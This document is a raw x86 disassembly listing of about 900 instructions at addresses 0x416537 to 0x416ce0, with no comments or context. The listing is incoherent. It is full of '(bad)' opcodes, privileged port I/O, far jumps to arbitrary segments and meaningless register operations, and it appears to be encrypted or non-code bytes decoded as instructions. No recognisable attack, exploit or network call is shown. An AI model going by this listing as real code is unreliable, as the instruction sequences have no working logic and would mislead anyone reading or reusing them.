  416537:	push   cs
  416538:	push   ds
  416539:	sub    bh,BYTE PTR [esi+0x3596c50a]
  41653f:	xchg   esi,eax
  416540:	mov    ch,0x9
  416542:	addr16 ds jb 0x4164d4
  416546:	out    dx,eax
  416547:	jmp    0x703c2e7f
  41654c:	mov    edx,DWORD PTR [edx]
  41654e:	rcr    DWORD PTR [bp+si],0x32
  416552:	cmc    
  416553:	sbb    al,BYTE PTR [edi]
  416555:	push   ecx
  416556:	sub    ebp,DWORD PTR ss:[ecx]
  416559:	(bad)
  41655c:	cmp    al,BYTE PTR [ebp-0x35]
  41655f:	and    al,0x29
  416561:	dec    esi
  416562:	shr    DWORD PTR [edx+0x1d9dadce],0xbe
  416569:	jo     0x4165dd
  41656b:	test   BYTE PTR [ecx+0x3e1b4f1f],0xf6
  416572:	dec    esi
  416573:	inc    ecx
  416574:	xor    edx,DWORD PTR [ecx+0x7a354fad]
  41657a:	ret    0xc5e8
  41657d:	rcr    BYTE PTR [edx-0x43fb5ed0],cl
  416583:	sbb    BYTE PTR [edi+0x69],dh
  416586:	es push eax
  416588:	mov    bh,0xfa
  41658a:	aam    0x44
  41658c:	in     al,dx
  41658d:	imul   edx,DWORD PTR [ebx-0x44b73841],0xffffffd9
  416594:	cmp    DWORD PTR [esi],0xffffffe6
  416597:	rcr    BYTE PTR [ebx+0x5c4b4246],0x74
  41659e:	test   al,0x44
  4165a0:	adc    DWORD PTR [ebx-0x2b],ebp
  4165a3:	loope  0x4165aa
  4165a5:	(bad)  
  4165a6:	push   edx
  4165a7:	fldcw  WORD PTR [ebx-0x74]
  4165aa:	stc    
  4165ab:	sbb    eax,0x6a832c17
  4165b0:	push   eax
  4165b1:	or     eax,0x9d3bd05b
  4165b6:	jp     0x41656f
  4165b8:	xor    al,0x8e
  4165ba:	mov    dh,0x4f
  4165bc:	stos   BYTE PTR es:[edi],al
  4165bd:	aad    0x87
  4165bf:	mov    ds:0x4a826c5b,eax
  4165c4:	inc    esp
  4165c5:	inc    ecx
  4165c6:	mov    cl,0x6d
  4165c8:	loope  0x416621
  4165ca:	and    ebp,DWORD PTR [ebp+esi*2+0x1aff8cdb]
  4165d1:	jp     0x416645
  4165d3:	and    eax,0xfae64fe
  4165d8:	push   es
  4165d9:	push   ss
  4165da:	je     0x416597
  4165dc:	fidiv  DWORD PTR [esi+0x79]
  4165df:	jmp    0xa06d:0xf7f89ca8
  4165e6:	and    DWORD PTR [edi],ebp
  4165e8:	scas   al,BYTE PTR es:[edi]
  4165e9:	xchg   ecx,eax
  4165ea:	xor    ebx,DWORD PTR [ecx+0x2d]
  4165ed:	dec    BYTE PTR ds:0x990568e2
  4165f3:	data16 je 0x4165d3
  4165f6:	mov    dh,0x18
  4165f8:	xchg   ecx,eax
  4165f9:	cmp    ebx,DWORD PTR [esi-0x5c89a8a0]
  4165ff:	dec    esi
  416600:	sbb    al,0x5d
  416602:	mov    eax,ds:0xd2cb6a8d
  416607:	lahf   
  416608:	sub    BYTE PTR [eax],bh
  41660a:	mov    dh,0xea
  41660c:	scas   al,BYTE PTR es:[edi]
  41660d:	outs   dx,DWORD PTR ds:[esi]
  41660e:	mov    al,ss:0xb021e4d0
  416614:	(bad)  
  416615:	clc    
  416616:	stos   DWORD PTR es:[edi],eax
  416617:	mov    ch,0x7d
  416619:	ret    
  41661a:	shr    ebx,1
  41661c:	mov    edi,0x8016a109
  416621:	mov    edx,DWORD PTR [esi]
  416623:	retf   0x10ba
  416626:	jg     0x41669d
  416628:	and    dh,BYTE PTR [edi+0x5d]
  41662b:	out    0xbb,al
  41662d:	test   al,0xc0
  41662f:	cmp    DWORD PTR [edx],0x2c
  416632:	inc    ecx
  416633:	lahf   
  416634:	rol    edx,cl
  416636:	out    0x3e,al
  416638:	push   edi
  416639:	in     al,dx
  41663a:	mov    edx,ecx
  41663c:	cs sbb eax,0x99bad8dd
  416642:	(bad)  [ecx]
  416644:	repz adc edi,DWORD PTR es:[ecx]
  416648:	pushf  
  416649:	jmp    0xe7fd3e1f
  41664e:	sub    eax,0x3ef41b37
  416653:	retf   
  416654:	pushf  
  416655:	push   eax
  416656:	pusha  
  416657:	xchg   ecx,eax
  416658:	fst    st(1)
  41665a:	popf   
  41665b:	sbb    eax,0x58162e84
  416660:	xchg   ecx,eax
  416661:	xchg   esp,eax
  416662:	pop    ecx
  416663:	pop    edi
  416664:	pop    ss
  416665:	cmp    DWORD PTR [ecx+0x3056d5e0],ebp
  41666b:	std    
  41666c:	sti    
  41666d:	cmp    dl,BYTE PTR [edi-0x75]
  416670:	push   es
  416671:	arpl   WORD PTR [ecx+0x47],cx
  416674:	mov    al,0xd5
  416676:	dec    ecx
  416677:	dec    esi
  416678:	inc    esi
  416679:	test   eax,0xf5946fae
  41667e:	outs   dx,DWORD PTR ds:[esi]
  41667f:	les    esp,FWORD PTR [edx]
  416681:	xor    DWORD PTR [edx-0x17],esi
  416684:	jge    0x41661d
  416686:	xor    DWORD PTR [eax+0x62],0xf48321c
  41668d:	xchg   edx,esi
  41668f:	je     0x416665
  416691:	pop    esp
  416692:	div    BYTE PTR ds:[ebp+0x4974061e]
  416699:	push   ecx
  41669a:	aam    0x56
  41669c:	xchg   ecx,eax
  41669d:	sub    al,0xa6
  41669f:	adc    ah,al
  4166a1:	(bad)  
  4166a2:	adc    DWORD PTR [edx],edi
  4166a4:	adc    BYTE PTR [edi-0x5584d6ab],al
  4166aa:	sub    cl,al
  4166ac:	pop    ss
  4166ad:	imul   ebp,DWORD PTR [edi-0x2aad0690],0x4c1fcf21
  4166b7:	jecxz  0x41672f
  4166b9:	dec    esi
  4166ba:	cdq    
  4166bb:	jae    0x41669d
  4166bd:	sahf   
  4166be:	pop    eax
  4166bf:	(bad)
  4166c3:	fwait
  4166c4:	test   al,0x7d
  4166c6:	sbb    bl,ch
  4166c8:	lds    edi,FWORD PTR [edi]
  4166ca:	ins    BYTE PTR es:[edi],dx
  4166cb:	and    DWORD PTR [eax+0x23],ecx
  4166ce:	int3   
  4166cf:	enter  0xc0a4,0x47
  4166d3:	jbe    0x4166c4
  4166d5:	call   0xe5c5:0xa8f80e1b
  4166dc:	stos   DWORD PTR es:[edi],eax
  4166dd:	jnp    0x4166bf
  4166df:	(bad)  
  4166e0:	fsubr  DWORD PTR [ecx+0x60]
  4166e3:	push   ds
  4166e4:	cmp    DWORD PTR [edx-0x26154a4e],esp
  4166ea:	xlat   BYTE PTR ds:[ebx]
  4166eb:	inc    ecx
  4166ec:	push   eax
  4166ed:	test   al,0xd
  4166ef:	fidivr WORD PTR [edx+0x15831dd3]
  4166f5:	hlt    
  4166f6:	push   0xffffffdd
  4166f8:	mov    bl,0xcd
  4166fa:	div    ecx
  4166fc:	inc    esp
  4166fd:	imul   esp,DWORD PTR [ecx],0xffffffea
  416700:	pop    ebx
  416701:	std    
  416702:	sbb    DWORD PTR [ebx+0x28ca7a2],ecx
  416708:	in     eax,dx
  416709:	cli    
  41670a:	xor    esp,esi
  41670c:	and    al,0x53
  41670e:	push   esi
  41670f:	sub    ch,al
  416711:	mov    bl,0xf0
  416713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416714:	(bad)  
  416715:	push   edi
  416716:	dec    esi
  416717:	ror    DWORD PTR fs:[esi-0x637e8a93],1
  41671e:	(bad)  
  41671f:	pop    edi
  416720:	std    
  416721:	xor    ecx,DWORD PTR [edi]
  416723:	fidiv  WORD PTR [esi+0x79]
  416726:	push   esi
  416727:	mov    esi,0x8f96463e
  41672c:	mov    esp,DWORD PTR [ecx+0x78c9e59a]
  416732:	inc    esi
  416733:	(bad)  
  416734:	in     al,dx
  416735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416736:	mov    edx,ebx
  416738:	popa   
  416739:	xor    al,BYTE PTR [ebx]
  41673b:	adc    esp,ebp
  41673d:	ror    BYTE PTR [ebx],0xf3
  416740:	cwde   
  416741:	inc    ebp
  416742:	das    
  416743:	push   ebp
  416744:	jb     0x41670f
  416746:	shl    DWORD PTR [ebx],0x5f
  416749:	sub    al,0x8d
  41674b:	push   ebx
  41674c:	repnz bound ebx,QWORD PTR [eax+0x66e53ab9]
  416753:	adc    DWORD PTR [eax],0x58
  416756:	xchg   ebp,eax
  416757:	in     al,0x23
  416759:	mov    ebp,0xb52ffc96
  41675e:	and    al,0x4f
  416760:	xor    eax,0xd944f94b
  416765:	out    dx,eax
  416766:	fdivp  st(5),st
  416768:	mov    esp,0x30cf2b02
  41676d:	dec    esi
  41676e:	jge    0x416733
  416770:	lods   al,BYTE PTR ds:[esi]
  416771:	icebp  
  416772:	inc    ebp
  416773:	loope  0x41671d
  416775:	lock rcl bl,1
  416778:	daa    
  416779:	test   al,ch
  41677b:	push   ecx
  41677c:	int    0x3b
  41677e:	mov    bh,0x41
  416780:	push   es
  416781:	icebp  
  416782:	stos   BYTE PTR es:[edi],al
  416783:	stos   BYTE PTR es:[edi],al
  416784:	cmp    ebp,ecx
  416786:	test   DWORD PTR [edi],esi
  416788:	ins    DWORD PTR es:[edi],dx
  416789:	xor    eax,0xf0c19183
  41678e:	lea    ebp,[ecx+0x1b777a45]
  416794:	(bad)  
  416795:	xlat   BYTE PTR ds:[ebx]
  416796:	fldcw  WORD PTR [edx]
  416798:	lock jnp 0x41681a
  41679b:	outs   dx,BYTE PTR ds:[esi]
  41679c:	scas   al,BYTE PTR es:[edi]
  41679d:	arpl   WORD PTR [eax-0x3e736028],si
  4167a3:	out    0x37,al
  4167a5:	mov    dh,0x3e
  4167a7:	cdq    
  4167a8:	push   es
  4167a9:	and    edi,DWORD PTR [ebp-0x504cf66a]
  4167af:	sbb    eax,esi
  4167b1:	mov    bh,0xc6
  4167b3:	out    dx,al
  4167b4:	dec    ebp
  4167b5:	push   es
  4167b6:	scas   al,BYTE PTR es:[edi]
  4167b7:	jmp    0x3a7a:0xabdf4b80
  4167be:	std    
  4167bf:	or     cl,0x91
  4167c2:	push   cs
  4167c3:	add    eax,edi
  4167c5:	inc    edx
  4167c6:	test   eax,0xd5200424
  4167cb:	push   ss
  4167cc:	lock push edi
  4167ce:	add    DWORD PTR ds:0xbdccb445,esi
  4167d4:	and    BYTE PTR [edi*8-0x773f2bfc],ah
  4167db:	addr16 mov ebp,0x26f809c5
  4167e1:	dec    eax
  4167e2:	pop    ss
  4167e3:	add    bl,ah
  4167e5:	inc    esp
  4167e6:	or     eax,0x9c65bfbf
  4167eb:	ins    BYTE PTR es:[edi],dx
  4167ec:	sub    BYTE PTR [eax],0xa7
  4167ef:	stc    
  4167f0:	mov    WORD PTR [ecx],es
  4167f2:	sbb    BYTE PTR [ebp+ebp*1-0x4f],ah
  4167f6:	mov    ecx,0xb0917429
  4167fb:	or     al,BYTE PTR [ecx-0x16]
  4167fe:	inc    edx
  4167ff:	or     DWORD PTR [edi+0x2a],ebx
  416802:	aad    0x65
  416804:	xlat   BYTE PTR es:[ebx]
  416806:	test   edi,ecx
  416808:	xor    ch,BYTE PTR [ebp-0xb5cc50a]
  41680e:	call   0xfc066fb3
  416813:	lds    esp,FWORD PTR [edx+0x7039e373]
  416819:	push   ebx
  41681a:	or     al,0xd6
  41681c:	jmp    0x158f8fbd
  416821:	scas   al,BYTE PTR es:[edi]
  416822:	sbb    bh,BYTE PTR [ebx+ecx*1-0x37887ca5]
  416829:	mov    ecx,0x32651fd7
  41682e:	rcr    DWORD PTR [ebp+0x68],1
  416831:	sbb    dl,BYTE PTR [esi]
  416833:	dec    edx
  416834:	int    0xf
  416836:	sti    
  416837:	add    edi,DWORD PTR [ecx+0x79]
  41683a:	mov    eax,ds:0x1e602587
  41683f:	loopne 0x41687d
  416841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416842:	(bad)  
  416843:	ror    BYTE PTR [ecx+0xa],1
  416846:	mov    edi,0x11c01275
  41684b:	mov    al,ds:0x9fbf3224
  416850:	into   
  416851:	pop    edi
  416852:	or     DWORD PTR [edi+edx*4-0x4b],eax
  416856:	jl     0x41687b
  416858:	out    0xab,al
  41685a:	add    cl,BYTE PTR [ebx+0x29]
  41685d:	leave  
  41685e:	sub    BYTE PTR [eax+0x2c],0xc1
  416862:	shr    dh,0xb
  416865:	into   
  416866:	mov    WORD PTR [ebp-0x27],gs
  416869:	out    dx,eax
  41686a:	cmp    al,0x6a
  41686c:	aas    
  41686d:	xor    esp,DWORD PTR [ecx+ebp*8+0x2c9b781f]
  416874:	adc    eax,DWORD PTR [edi+0x22]
  416877:	jle    0x4168a4
  416879:	test   DWORD PTR [edx],ebp
  41687b:	hlt    
  41687c:	repnz addr16 xchg ebx,eax
  41687f:	adc    BYTE PTR [ecx-0x13c2552d],dl
  416885:	push   ebx
  416886:	addr16 jg 0x41685f
  416889:	pop    ecx
  41688a:	jl     0x4168f2
  41688c:	fist   DWORD PTR [ebx]
  41688e:	inc    edx
  41688f:	inc    esi
  416890:	inc    esp
  416891:	xchg   esi,eax
  416892:	cmp    eax,0xe5c87308
  416897:	cmp    edx,DWORD PTR [esi+0x5be9543]
  41689d:	fwait
  41689e:	imul   esi,DWORD PTR [eax],0xf
  4168a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168a2:	mov    edi,edx
  4168a4:	dec    ebp
  4168a5:	cwde   
  4168a6:	addr16 add eax,0x5af57a57
  4168ac:	lods   al,BYTE PTR ds:[esi]
  4168ad:	mov    ch,0xad
  4168af:	cld    
  4168b0:	or     BYTE PTR [ecx+edx*8],0x30
  4168b4:	addr16 arpl si,bx
  4168b7:	xchg   BYTE PTR [ecx],bh
  4168b9:	ret    0x8ba9
  4168bc:	inc    edx
  4168bd:	mov    ch,0x4c
  4168bf:	mov    edx,0x674b08e9
  4168c4:	pop    esi
  4168c5:	pop    esi
  4168c6:	add    DWORD PTR [edx+0x7fe779d2],ebp
  4168cc:	rol    BYTE PTR [esi],1
  4168ce:	je     0x416910
  4168d0:	mov    ebp,0xf42090d5
  4168d5:	mov    eax,0x84b1fe94
  4168da:	das    
  4168db:	adc    esi,DWORD PTR [esi+0x4f9b698]
  4168e1:	or     DWORD PTR [edx-0x42],ebp
  4168e4:	ins    BYTE PTR es:[edi],dx
  4168e5:	enter  0x9200,0x61
  4168e9:	and    al,0xac
  4168eb:	xchg   edx,eax
  4168ec:	or     eax,0xd0b6b6de
  4168f1:	mov    cl,0x1d
  4168f3:	inc    DWORD PTR [ecx-0x1e229912]
  4168f9:	scas   al,BYTE PTR es:[edi]
  4168fa:	aad    0x74
  4168fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168fd:	dec    eax
  4168fe:	and    ebx,ecx
  416900:	add    esp,DWORD PTR [ebx+0x54893d07]
  416906:	mov    DWORD PTR [edx+0x764d0129],edi
  41690c:	dec    edx
  41690d:	repz fstp QWORD PTR [edi+0x17453b23]
  416914:	pop    ebp
  416915:	add    eax,DWORD PTR [esp-0x5d2894e4]
  41691c:	and    bh,BYTE PTR [edi-0x16abec5a]
  416922:	pop    dx
  416924:	push   ebx
  416925:	dec    eax
  416926:	sbb    ch,ch
  416928:	aad    0xe1
  41692a:	sbb    ch,BYTE PTR [edx]
  41692c:	mov    ah,0xcf
  41692e:	repnz add ch,al
  416931:	xor    eax,0x4cc4f81a
  416936:	adc    eax,0x5a97a876
  41693b:	sbb    DWORD PTR [eax+0x52],ebx
  41693e:	xchg   edx,eax
  41693f:	jb     0x416907
  416941:	xor    cl,ch
  416943:	cmp    DWORD PTR ds:0x26bc6e37,eax
  416949:	sub    al,0x59
  41694b:	xor    esi,DWORD PTR [esi+0x51]
  41694e:	pop    ss
  41694f:	mov    edx,0x9c1cafcb
  416954:	ja     0x416953
  416956:	pand   mm6,mm2
  416959:	jg     0x416945
  41695b:	pop    ebp
  41695c:	jae    0x416957
  41695e:	aaa    
  41695f:	stc    
  416960:	adc    esp,DWORD PTR [eax+0x47]
  416963:	push   edi
  416964:	sbb    al,0x40
  416966:	and    ch,dh
  416968:	jge    0x416905
  41696a:	stos   DWORD PTR es:[edi],eax
  41696b:	jmp    0x1bc1:0xeb918ac4
  416972:	stos   DWORD PTR es:[edi],eax
  416973:	jbe    0x4169ae
  416975:	dec    ebp
  416976:	mov    ebx,0x518b0ea9
  41697b:	sahf   
  41697c:	adc    eax,0x94bbdb6e
  416981:	dec    ebx
  416982:	and    DWORD PTR [ecx+0x713542e4],0x7b
  416989:	or     DWORD PTR [ecx],ebx
  41698b:	ffree  st(4)
  41698d:	cwde   
  41698e:	push   edx
  41698f:	and    edx,edi
  416991:	clc    
  416992:	mov    bh,BYTE PTR [ecx+0x171d2fd1]
  416998:	jb     0x4169d8
  41699a:	aad    0x83
  41699c:	adc    cl,BYTE PTR [edi+0x7bd31aeb]
  4169a2:	pop    edx
  4169a3:	fcmovb st,st(5)
  4169a5:	test   BYTE PTR [edi+0x4e],ch
  4169a8:	test   DWORD PTR [edx],edx
  4169aa:	in     eax,0x4f
  4169ac:	mov    ch,BYTE PTR [edi-0x1e5a712e]
  4169b2:	cmp    al,0x8c
  4169b4:	mov    ?,WORD PTR [esi-0x36851eb7]
  4169ba:	mov    ah,0x53
  4169bc:	sub    ebx,ebp
  4169be:	arpl   WORD PTR [ebx-0x52e52364],si
  4169c4:	push   esi
  4169c5:	in     eax,0x4a
  4169c7:	mov    ecx,0x815b9a05
  4169cc:	js     0x416972
  4169ce:	or     al,BYTE PTR [ebx]
  4169d0:	les    edi,FWORD PTR [esi+esi*8]
  4169d3:	test   DWORD PTR [edi-0x45],0xa171cbbc
  4169da:	inc    edi
  4169db:	cmp    al,0x7
  4169dd:	jbe    0x416a03
  4169df:	je     0x4169f6
  4169e1:	jo     0x416a11
  4169e3:	arpl   dx,di
  4169e5:	out    dx,al
  4169e6:	fdivr  DWORD PTR [esi]
  4169e8:	ja     0x416a16
  4169ea:	sbb    eax,0x6488af5e
  4169ef:	pop    edi
  4169f0:	jo     0x416a3b
  4169f2:	jmp    0xcb9cc927
  4169f7:	nop
  4169f8:	sbb    BYTE PTR [edx-0x3],al
  4169fb:	(bad)  
  4169fc:	pop    ecx
  4169fd:	add    dh,ah
  4169ff:	hlt    
  416a00:	sub    BYTE PTR [edx-0x33],ah
  416a03:	les    esi,FWORD PTR [eax+ecx*2-0x2e]
  416a07:	and    DWORD PTR [ecx+0x38],edi
  416a0a:	xlat   BYTE PTR ds:[ebx]
  416a0b:	retf   
  416a0c:	fstp   QWORD PTR [ebp+0x28e79b66]
  416a12:	repnz mov dl,0xe6
  416a15:	dec    ebx
  416a16:	mov    bh,al
  416a18:	mov    bh,0xc0
  416a1a:	inc    edi
  416a1b:	repnz adc BYTE PTR [edi],ah
  416a1e:	loope  0x416a4f
  416a20:	xchg   edi,eax
  416a21:	ins    DWORD PTR es:[edi],dx
  416a22:	sbb    BYTE PTR [ecx+0x6c296174],cl
  416a28:	outs   dx,DWORD PTR ds:[esi]
  416a29:	les    esi,FWORD PTR [eax-0x49]
  416a2c:	jle    0x416a00
  416a2e:	daa    
  416a2f:	test   eax,0x1742604c
  416a34:	addr16 mov ds:0x1073,al
  416a38:	js     0x416a6d
  416a3a:	adc    ebp,eax
  416a3c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  416a3e:	mov    ?,WORD PTR [eax]
  416a40:	stos   BYTE PTR es:[edi],al
  416a41:	cmp    al,0x23
  416a43:	push   eax
  416a44:	push   ecx
  416a45:	nop
  416a46:	cmp    BYTE PTR ds:0xc9d22fe4,al
  416a4c:	mov    ebx,0xb08983d9
  416a51:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416a53:	int    0x7c
  416a55:	scas   al,BYTE PTR es:[edi]
  416a56:	nop
  416a57:	scas   eax,DWORD PTR es:[edi]
  416a58:	sub    eax,0x5867f5c1
  416a5d:	dec    eax
  416a5e:	ja     0x416a4f
  416a60:	shr    BYTE PTR [ecx-0x39b6f0b4],0x4a
  416a67:	xchg   esp,eax
  416a68:	and    al,BYTE PTR [edx]
  416a6a:	cmp    esp,0x3150f80e
  416a70:	outs   dx,DWORD PTR ds:[esi]
  416a71:	(bad)  
  416a72:	(bad)  [edx-0x70]
  416a75:	icebp  
  416a76:	mov    ds:0xa258b37b,eax
  416a7b:	fisttp QWORD PTR [ebx+0x435e06f2]
  416a81:	pop    es
  416a82:	adc    DWORD PTR [edi],edx
  416a84:	sub    DWORD PTR [edi-0x36],ecx
  416a87:	mov    bl,0x46
  416a89:	(bad)
  416a8e:	xchg   DWORD PTR [esi-0x7b],ebx
  416a91:	xor    ecx,DWORD PTR ds:[ebx+0x35]
  416a95:	mov    esi,0xfdaa9d04
  416a9a:	out    0x7e,eax
  416a9c:	repz mov bl,0x7c
  416a9f:	jl     0x416a35
  416aa1:	jns    0x416ab0
  416aa3:	(bad)  [ecx+0x66]
  416aa6:	out    0x1b,eax
  416aa8:	fs stc 
  416aaa:	repz dec esi
  416aac:	push   es
  416aad:	int    0x11
  416aaf:	inc    esi
  416ab0:	retf   0x70ac
  416ab3:	adc    eax,DWORD PTR [ecx]
  416ab5:	or     DWORD PTR [edx-0x19fa374f],esi
  416abb:	ins    BYTE PTR es:[edi],dx
  416abc:	add    DWORD PTR [esi],eax
  416abe:	dec    ebx
  416abf:	daa    
  416ac0:	xacquire xchg BYTE PTR [eax+0x6c],al
  416ac4:	pop    DWORD PTR [eax*2-0x428331e8]
  416acb:	adc    al,0xf0
  416acd:	sar    DWORD PTR [eax+ebp*4-0x58],1
  416ad1:	push   esp
  416ad2:	test   DWORD PTR [edx+esi*1],edx
  416ad5:	mov    esi,0xd0011af9
  416ada:	inc    edx
  416adb:	push   ss
  416adc:	sbb    DWORD PTR [ecx+0x44da4505],0x90b92694
  416ae6:	out    0xad,al
  416ae8:	(bad)  
  416ae9:	int3   
  416aea:	fnstsw WORD PTR [ecx]
  416aec:	pop    edx
  416aed:	jecxz  0x416afc
  416aef:	sub    BYTE PTR [edi-0x30ee024e],ch
  416af5:	dec    ebp
  416af6:	std    
  416af7:	cmc    
  416af8:	dec    esi
  416af9:	dec    esi
  416afa:	shr    DWORD PTR [esi-0x3c],1
  416afd:	pop    ebx
  416afe:	sub    DWORD PTR [ecx+0x60],edx
  416b01:	int3   
  416b02:	addr16 xor al,bh
  416b05:	sbb    esi,esi
  416b07:	add    bh,ch
  416b09:	jmp    0xab1a791d
  416b0e:	out    dx,al
  416b0f:	jmp    0x416b4e
  416b11:	jle    0x416ac6
  416b13:	xchg   edi,eax
  416b14:	js     0x416b2f
  416b16:	in     eax,dx
  416b17:	pop    ebp
  416b18:	mov    dh,0xb7
  416b1a:	cld    
  416b1b:	push   esp
  416b1c:	and    BYTE PTR [eax+0x3029c184],bl
  416b22:	scas   al,BYTE PTR es:[edi]
  416b23:	pop    ss
  416b24:	mov    dl,0xff
  416b26:	in     al,dx
  416b27:	les    eax,FWORD PTR [ebx-0x78212465]
  416b2d:	frstor [esi-0x68b2902]
  416b33:	fwait
  416b34:	mov    ebp,0xb45a4525
  416b39:	mov    ecx,0x56de5b83
  416b3e:	mov    esp,0x6cee01eb
  416b43:	adc    al,0x29
  416b45:	out    dx,al
  416b46:	push   eax
  416b47:	neg    BYTE PTR [esp+ebx*8]
  416b4a:	test   eax,0x9c1a2efa
  416b4f:	jge    0x416bae
  416b51:	mov    edx,0xf2940071
  416b56:	add    eax,0x5d044c44
  416b5b:	popa   
  416b5c:	iret   
  416b5d:	jmp    0x3d5ceafe
  416b62:	daa    
  416b63:	ds pop esp
  416b65:	sub    BYTE PTR [eax+0x7e],0x9e
  416b69:	ds in  eax,0xc4
  416b6c:	mov    dl,0x7a
  416b6e:	lods   al,BYTE PTR ds:[esi]
  416b6f:	in     al,0x30
  416b71:	mov    al,0xf5
  416b73:	and    eax,0xcae22b25
  416b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b79:	jp     0x416b15
  416b7b:	test   al,0xaa
  416b7d:	scas   al,BYTE PTR es:[edi]
  416b7e:	and    eax,0xf89eae4a
  416b83:	and    DWORD PTR [ebx],ecx
  416b85:	cmp    DWORD PTR [ebx],ebx
  416b87:	jne    0x416bee
  416b89:	mov    esi,0x419759fe
  416b8e:	mov    sp,0xfe83
  416b92:	sbb    eax,0x5d853460
  416b97:	add    DWORD PTR [edi-0x5],0xb085214e
  416b9e:	shl    ch,1
  416ba0:	imul   ebp,DWORD PTR [eax],0xfafd2d14
  416ba6:	das    
  416ba7:	rcl    BYTE PTR [eax],0xb6
  416baa:	pop    ebx
  416bab:	les    ebp,FWORD PTR [edx+eax*1-0x55]
  416baf:	jp     0x416b81
  416bb1:	add    BYTE PTR [ecx-0x5ad5ed4d],0x9
  416bb8:	mov    ecx,0xaad2cdf
  416bbd:	mov    bh,0x1c
  416bbf:	inc    edi
  416bc0:	jg     0x416b9e
  416bc2:	into   
  416bc3:	outs   dx,DWORD PTR ds:[esi]
  416bc4:	in     al,dx
  416bc5:	(bad)  
  416bc6:	jl     0x416c22
  416bc8:	jno    0x416c41
  416bca:	add    edi,DWORD PTR [eax+edi*1-0x6e9240d2]
  416bd1:	cmp    edx,eax
  416bd3:	aam    0xb8
  416bd5:	mov    ebp,0x454f4c54
  416bda:	mov    edx,0x7553ceb1
  416bdf:	mov    WORD PTR [edi+0x47],es
  416be2:	icebp  
  416be3:	repz loop 0x416bb8
  416be6:	cmc    
  416be7:	jae    0x416c27
  416be9:	lods   al,BYTE PTR ds:[esi]
  416bea:	inc    BYTE PTR ds:0xaac6a7d4
  416bf0:	(bad)  
  416bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bf2:	mov    ebx,0x727c00a2
  416bf7:	xchg   esp,eax
  416bf8:	pop    ss
  416bf9:	inc    esi
  416bfa:	lahf   
  416bfb:	sub    esp,eax
  416bfd:	sbb    al,0xdb
  416bff:	test   DWORD PTR [esp+edx*4+0x32],ebx
  416c03:	mov    ebp,0x653ca88e
  416c08:	(bad)  
  416c09:	sub    DWORD PTR [ebx],esi
  416c0b:	sub    eax,0x93f1fb5c
  416c10:	sbb    al,0xfd
  416c12:	xchg   DWORD PTR ds:0x72cceafe,ebx
  416c18:	das    
  416c19:	call   0x4f09:0x4026a30f
  416c20:	sbb    BYTE PTR [edi+eax*1],dl
  416c23:	retf   0xd576
  416c26:	lods   al,BYTE PTR ds:[esi]
  416c27:	mov    ecx,0x9410c1f7
  416c2c:	cmp    dl,BYTE PTR [edx]
  416c2e:	sub    edi,esp
  416c30:	sbb    dh,BYTE PTR cs:[eax]
  416c33:	(bad)  
  416c34:	and    ebp,DWORD PTR [ebx-0x3d21a537]
  416c3a:	clc    
  416c3b:	adc    al,0xcb
  416c3d:	clc    
  416c3e:	imul   eax,DWORD PTR [eax],0xc9ea0bc1
  416c44:	push   eax
  416c45:	pop    esp
  416c46:	xchg   esp,ecx
  416c48:	or     DWORD PTR [eax+0x16],ecx
  416c4b:	neg    DWORD PTR [ebx+0x2]
  416c4e:	xchg   esp,eax
  416c4f:	popa   
  416c50:	sub    DWORD PTR [edi],ecx
  416c52:	pushf  
  416c53:	mov    edx,0xd0998c8b
  416c58:	test   al,0xee
  416c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c5b:	add    ebp,ebx
  416c5d:	fbld   TBYTE PTR [ebx+0x67]
  416c60:	imul   ebx,DWORD PTR [ebx+0x37d36e45],0x96210f6f
  416c6a:	adc    DWORD PTR [esi-0x5e15a287],esp
  416c70:	into   
  416c71:	lods   eax,DWORD PTR ds:[esi]
  416c72:	stos   DWORD PTR es:[edi],eax
  416c73:	aam    0xe0
  416c75:	fnstcw WORD PTR [eax-0x73]
  416c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c7a:	add    ah,BYTE PTR [ebp+0x2b]
  416c7d:	inc    ecx
  416c7e:	stos   BYTE PTR es:[edi],al
  416c7f:	jl     0x416cdb
  416c81:	repnz pop ecx
  416c83:	pop    ds
  416c84:	cwde   
  416c85:	push   es
  416c86:	add    BYTE PTR [ebx+0x1a],dh
  416c89:	scas   eax,DWORD PTR es:[edi]
  416c8a:	in     al,0x1
  416c8c:	fisttp QWORD PTR [edx-0x46]
  416c8f:	cld    
  416c90:	rcl    BYTE PTR ss:[ebp-0x26],1
  416c94:	dec    esi
  416c95:	(bad)  [ecx+0x6]
  416c98:	mov    edx,0xad528568
  416c9d:	out    dx,al
  416c9e:	in     eax,dx
  416c9f:	int    0xb
  416ca1:	es pop ss
  416ca3:	lods   eax,DWORD PTR ds:[esi]
  416ca4:	push   ebp
  416ca5:	fadd   DWORD PTR [ecx]
  416ca7:	xchg   ebp,eax
  416ca8:	(bad)  [eax+0x36]
  416cab:	les    edx,FWORD PTR [edx-0x3f]
  416cae:	ror    BYTE PTR [edx+edx*8],1
  416cb1:	dec    eax
  416cb2:	xor    al,0x34
  416cb4:	pop    ds
  416cb5:	and    BYTE PTR [edx],ch
  416cb7:	push   edi
  416cb8:	pusha  
  416cb9:	mov    dl,0x1d
  416cbb:	or     BYTE PTR fs:[edi+eiz*4+0x328087d1],0x17
  416cc4:	out    0xb5,al
  416cc6:	sahf   
  416cc7:	xor    ch,ch
  416cc9:	and    ah,bl
  416ccb:	xchg   edi,eax
  416ccc:	stos   DWORD PTR es:[edi],eax
  416ccd:	shr    BYTE PTR [eax],1
  416ccf:	xchg   esi,eax
  416cd0:	test   BYTE PTR [edi],ah
  416cd2:	jl     0x416cc5
  416cd4:	xchg   edx,eax
  416cd5:	(bad)  
  416cd6:	and    edx,eax
  416cd8:	inc    ebx
  416cd9:	sub    al,0xdf
  416cdb:	mov    eax,ds:0x44c4f17e
  416ce0:	(bad)  
